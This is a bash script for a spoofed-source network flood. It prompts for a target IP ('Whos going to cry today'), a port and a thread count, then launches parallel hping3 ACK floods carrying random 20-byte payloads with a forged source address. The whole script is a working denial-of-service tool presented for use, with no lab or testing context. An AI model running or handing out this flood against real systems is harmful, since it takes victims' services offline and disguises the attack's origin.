#! /bin/bash

echo "###################### Synonymous payload (20 bytes payload) with spoofed source of victim itself ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en ENTER PORT NUMBER:
read port
echo -en ENTER NUMBER OF HPING THREADS:
read count
echo "################# STARTING THREADS #####################################################################################"
#packet=$1
#port=$2
#count=$3

cd /usr/bin
for i in `seq 1 $count`;
 do
python -c "import random, sys;
sys.stdout.write(''.join(['\\\x{0:02x}'.format(random.randint(0,255)) for _ in range(20)]))" > synonymous_payload$i
hping3 $tarip -A -d 20 -p $port --flood -I eth2.101 -E synonymous_payload$i --spoof 10.10.10.2 &
 done
